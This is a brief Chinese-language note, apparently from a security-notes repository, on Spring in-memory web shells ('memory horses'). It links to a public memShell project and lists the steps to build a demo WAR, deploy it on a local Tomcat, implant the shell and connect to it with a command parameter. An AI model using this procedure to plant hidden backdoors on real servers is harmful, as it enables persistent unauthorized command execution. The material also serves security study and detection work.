# spring 内存马

具体利用可参考feihong师傅的代码 

https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/spring/ControllerBased.java

利用:

1. git clone https://github.com/feihong-cs/memShell.git

2. mvn 打包成 war 包 重命名 springmemshell.war

3. copy war 至 tomcat webapp 目录下 。访问 http://127.0.0.1:8080/springmemshell/ 返回 Hello World!  说明部署成功

4. 植入内存马 http://127.0.0.1:8080/springmemshell/hello 返回success 则植入成功

5. 连接内存马 http://127.0.0.1:8080/springmemshell/poc2020?type=basic&pass=id

![image](https://user-images.githubusercontent.com/26767398/116067209-84ada600-a6bb-11eb-9d2e-01bd314d2075.png)
